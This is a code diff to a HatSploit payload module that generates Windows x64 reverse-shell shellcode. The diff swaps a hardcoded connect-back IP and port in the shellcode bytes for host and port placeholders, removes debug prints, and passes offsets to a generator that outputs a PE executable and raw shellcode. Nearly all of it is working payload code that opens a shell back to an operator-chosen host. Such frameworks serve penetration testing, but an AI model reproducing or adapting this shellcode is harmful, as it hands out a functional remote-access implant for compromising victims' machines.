@@ -46,14 +46,10 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        ip = self.ip_bytes(connback_host)
-        port = self.port_bytes(connback_port)
-
-        '''
         offsets = {
             'cbhost': connback_host,
             'cbport': connback_port
-        }'''
+        }
 
         shellcode = (
             b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
@@ -71,7 +67,7 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
             b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
             b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
-            b"\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\xc0\xa8\x02\x6e\x41\x54"
+            b"\x49\x89\xe5\x49\xbc\x02\x00:cbport:port::cbhost:ip:\x41\x54"
             b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
             b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
             b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
@@ -88,11 +84,8 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
             b"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
         )
-        
-        print(ip, port)
-        print(shellcode.find(ip), shellcode.find(port))
 
-        payload = self.generate('pe', 'x64', shellcode)#, offsets)
-        raw_payload = self.generate('raw', 'generic', shellcode)#, offsets)
+        payload = self.generate('pe', 'x64', shellcode, offsets)
+        raw_payload = self.generate('raw', 'generic', shellcode, offsets)
 
         return [payload, raw_payload]
